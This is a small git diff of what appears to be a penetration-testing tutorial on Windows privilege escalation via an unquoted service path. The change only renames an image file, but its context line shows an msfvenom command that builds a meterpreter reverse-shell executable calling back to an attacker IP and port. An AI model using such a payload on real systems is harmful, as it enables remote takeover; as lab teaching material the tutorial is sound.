@@ -123,7 +123,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.54.172 LPORT=5454 -f exe
 
 host and transfer the payload:
 
-<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 And of course we are going to save it in the unquoted service path:
 
